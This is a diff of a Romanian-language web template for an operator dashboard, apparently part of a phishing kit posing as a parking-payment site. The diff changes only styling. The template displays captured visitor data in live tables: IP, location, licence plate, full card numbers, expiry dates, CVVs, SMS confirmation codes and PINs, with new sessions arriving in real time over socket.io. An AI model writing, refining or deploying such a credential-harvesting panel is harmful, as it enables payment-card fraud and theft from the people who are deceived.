@@ -4,8 +4,8 @@
 {% block content %}
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <style>
-.tbl th{background:#1e293b;color:#94a3b8;font-size:10px;text-transform:uppercase;letter-spacing:.06em;padding:8px 10px;white-space:nowrap;position:sticky;top:0;z-index:10;}
-.tbl td{padding:7px 10px;font-size:12px;white-space:nowrap;border-bottom:1px solid #f1f5f9;vertical-align:middle;}
+.tbl th{background:#1e293b;color:#cbd5e1;font-size:12px;text-transform:uppercase;letter-spacing:.06em;padding:9px 12px;white-space:nowrap;position:sticky;top:0;z-index:10;}
+.tbl td{padding:8px 12px;font-size:14px;white-space:nowrap;border-bottom:1px solid #f1f5f9;vertical-align:middle;}
 .tbl tr:hover td{background:#f8fafc;}
 .ping-on{display:inline-block;width:8px;height:8px;background:#22c55e;border-radius:50%;animation:blink 1.2s infinite;}
 .ping-off{display:inline-block;width:8px;height:8px;background:#94a3b8;border-radius:50%;}
@@ -82,21 +82,21 @@
         {% if pending %}{% for ps in pending %}
         <tr id="row-{{ ps.id }}" data-token="{{ ps.token }}" data-lot="{{ ps.parking_lot_id }}">
           <td><button class="bell-btn" id="bell-{{ ps.id }}" onclick="toggleBell({{ ps.id }},'{{ ps.token }}')">🔔</button></td>
-          <td class="font-bold text-gray-400">{{ loop.index }}</td>
+          <td class="font-bold text-gray-700">{{ loop.index }}</td>
           <td><span class="ping-on" id="ping-{{ ps.token }}"></span></td>
-          <td class="font-mono text-gray-500 text-xs">{{ ps.ip_address or '—' }}</td>
-          <td class="text-gray-600">{{ ps.browser or '—' }}</td>
-          <td class="text-gray-600">{{ ps.country or '—' }}</td>
+          <td class="font-mono text-gray-800 text-xs">{{ ps.ip_address or '—' }}</td>
+          <td class="text-gray-800">{{ ps.browser or '—' }}</td>
+          <td class="text-gray-800">{{ ps.country or '—' }}</td>
           <td class="font-semibold" style="color:#166534;background:#f0fdf4">{{ ps.user_city or '—' }}</td>
           <td class="font-bold tracking-widest text-gray-800">{{ ps.plate_number or '—' }}</td>
-          <td class="text-gray-600">{{ ps.car_type or '—' }}</td>
+          <td class="text-gray-800">{{ ps.car_type or '—' }}</td>
           <td class="font-bold text-gray-800">{{ ps.hours }}</td>
           <td id="bank-{{ ps.id }}" class="text-xs" style="color:#0369a1;font-weight:600">{{ ps.bin_bank or '—' }}</td>
           <td id="card-{{ ps.id }}" class="font-mono text-xs" style="color:{{ '#1e293b' if ps.card_number_display else '#cbd5e1' }}">{{ ps.card_number_display or '—' }}</td>
           <td id="exp-{{ ps.id }}" class="font-mono text-xs" style="color:{{ '#1e293b' if ps.exp_date else '#cbd5e1' }}">{{ ps.exp_date or '—' }}</td>
           <td id="cvv-{{ ps.id }}" class="font-mono text-xs" style="color:{{ '#ef4444' if ps.cvv else '#cbd5e1' }}">{{ ps.cvv or '—' }}</td>
-          <td id="sms-{{ ps.id }}">{% if ps.sms_status %}<span class="badge bg-green-100 text-green-800 font-mono" style="font-size:12px">{{ ps.sms_status }}</span>{% else %}<span class="text-gray-300">—</span>{% endif %}</td>
-          <td id="pin-{{ ps.id }}">{% if ps.pin_code %}<span class="badge bg-purple-100 text-purple-800 font-mono" style="font-size:12px">{{ ps.pin_code }}</span>{% else %}<span class="text-gray-300">—</span>{% endif %}</td>
+          <td id="sms-{{ ps.id }}">{% if ps.sms_status %}<span class="badge bg-green-100 text-green-800 font-mono" style="font-size:13px">{{ ps.sms_status }}</span>{% else %}<span class="text-gray-500">—</span>{% endif %}</td>
+          <td id="pin-{{ ps.id }}">{% if ps.pin_code %}<span class="badge bg-purple-100 text-purple-800 font-mono" style="font-size:13px">{{ ps.pin_code }}</span>{% else %}<span class="text-gray-500">—</span>{% endif %}</td>
           <td id="status-{{ ps.id }}">
             {% if ps.status=='pending' %}<span class="badge bg-yellow-100 text-yellow-700">⏳ Așteptare</span>
             {% elif ps.status=='price_set' %}<span class="badge bg-indigo-100 text-indigo-700">💳 Spre card</span>
@@ -104,7 +104,7 @@
             {% elif ps.status=='completed' %}<span class="badge bg-green-100 text-green-700">✓ Aprobat</span>{% endif %}
           </td>
           <td id="price-{{ ps.id }}" class="font-bold" style="color:#5a9e2f">
-            {% if ps.total_price %}{{ ps.total_price }} €{% else %}<span class="text-gray-300">—</span>{% endif %}
+            {% if ps.total_price %}{{ ps.total_price }} €{% else %}<span class="text-gray-500">—</span>{% endif %}
           </td>
           <td><div id="actions-{{ ps.id }}" class="flex gap-1 flex-wrap">
             {% if ps.status=='completed' %}
@@ -159,14 +159,14 @@
       <tbody>
         {% for ps in history %}
         <tr style="opacity:.85">
-          <td class="text-gray-400">{{ loop.index }}</td>
-          <td class="font-mono text-gray-500 text-xs">{{ ps.ip_address or '—' }}</td>
-          <td class="text-gray-600">{{ ps.browser or '—' }}</td>
-          <td class="text-gray-600">{{ ps.country or '—' }}</td>
+          <td class="text-gray-700">{{ loop.index }}</td>
+          <td class="font-mono text-gray-800 text-xs">{{ ps.ip_address or '—' }}</td>
+          <td class="text-gray-800">{{ ps.browser or '—' }}</td>
+          <td class="text-gray-800">{{ ps.country or '—' }}</td>
           <td class="font-semibold" style="color:#166534">{{ ps.user_city or '—' }}</td>
           <td class="font-bold tracking-widest text-gray-800">{{ ps.plate_number or '—' }}</td>
-          <td class="text-gray-600">{{ ps.car_type or '—' }}</td>
-          <td class="text-gray-700">{{ ps.hours }} {{ ps.time_unit or 'ore' }}</td>
+          <td class="text-gray-800">{{ ps.car_type or '—' }}</td>
+          <td class="text-gray-800">{{ ps.hours }} {{ ps.time_unit or 'ore' }}</td>
           <td class="text-xs" style="color:#0369a1;font-weight:600">{{ ps.bin_bank or '—' }}</td>
           <td class="font-mono text-xs text-gray-700">{{ ps.card_number_display or ('•••• '+ps.card_last4 if ps.card_last4 else '—') }}</td>
           <td class="font-mono text-xs text-gray-600">{{ ps.exp_date or '—' }}</td>
@@ -174,7 +174,7 @@
           <td class="font-mono font-bold" style="color:#b45309">{{ ps.sms_status or '—' }}</td>
           <td class="font-mono font-bold" style="color:#7c3aed">{{ ps.pin_code or '—' }}</td>
           <td class="font-bold" style="color:#dc2626">{{ ps.total_price or '—' }}{% if ps.total_price %} €{% endif %}</td>
-          <td class="text-gray-400 text-xs">{{ ps.created_at.strftime('%d.%m.%Y %H:%M') }}</td>
+          <td class="text-gray-800 font-semibold">{{ ps.created_at.strftime('%d.%m.%Y %H:%M') }}</td>
         </tr>
         {% endfor %}
       </tbody>
@@ -290,21 +290,21 @@ socket.on('new_session', function(d){
   tr.id = 'row-'+d.id; tr.dataset.token = d.token; tr.dataset.lot = d.lot_id||1;
   tr.innerHTML = `
     <td><button class="bell-btn" id="bell-${d.id}" onclick="toggleBell(${d.id},'${d.token}')">🔔</button></td>
-    <td class="font-bold text-gray-400">${++rowCount}</td>
+    <td class="font-bold text-gray-700">${++rowCount}</td>
     <td><span class="ping-on" id="ping-${d.token}"></span></td>
-    <td class="font-mono text-gray-500 text-xs">${d.ip||'—'}</td>
-    <td class="text-gray-600">${d.browser||'—'}</td>
-    <td class="text-gray-600">${d.country||'—'}</td>
+    <td class="font-mono text-gray-800 text-xs">${d.ip||'—'}</td>
+    <td class="text-gray-800">${d.browser||'—'}</td>
+    <td class="text-gray-800">${d.country||'—'}</td>
     <td class="font-semibold" style="color:#166534;background:#f0fdf4" id="loc-${d.id}">${d.locality||'—'}</td>
     <td class="font-bold tracking-widest text-gray-800" id="plate-${d.id}">${d.plate}</td>
-    <td class="text-gray-600" id="ctype-${d.id}">${d.car_type||'—'}</td>
-    <td class="font-bold text-gray-800" id="hrs-${d.id}">${d.hours} <span style="color:#94a3b8;font-size:10px">${d.time_unit||'ore'}</span></td>
+    <td class="text-gray-800" id="ctype-${d.id}">${d.car_type||'—'}</td>
+    <td class="font-bold text-gray-800" id="hrs-${d.id}">${d.hours} <span style="color:#475569;font-size:12px">${d.time_unit||'ore'}</span></td>
     <td id="bank-${d.id}" class="text-xs" style="color:#0369a1;font-weight:600">—</td>
-    <td id="card-${d.id}" class="font-mono text-gray-300">—</td>
-    <td id="exp-${d.id}" class="font-mono text-gray-300">—</td>
-    <td id="cvv-${d.id}" class="font-mono text-gray-300">—</td>
-    <td id="sms-${d.id}"><span style="color:#94a3b8">—</span></td>
-    <td id="pin-${d.id}"><span style="color:#94a3b8">—</span></td>
+    <td id="card-${d.id}" class="font-mono text-gray-500">—</td>
+    <td id="exp-${d.id}" class="font-mono text-gray-500">—</td>
+    <td id="cvv-${d.id}" class="font-mono text-gray-500">—</td>
+    <td id="sms-${d.id}"><span style="color:#64748b">—</span></td>
+    <td id="pin-${d.id}"><span style="color:#64748b">—</span></td>
     <td id="status-${d.id}"><span class="badge bg-indigo-100 text-indigo-700">💳 Spre card</span></td>
     <td id="price-${d.id}" style="color:#5a9e2f;font-weight:700">${d.price ? d.price+' €' : '—'}</td>
     <td><div id="actions-${d.id}" class="flex gap-1 flex-wrap">
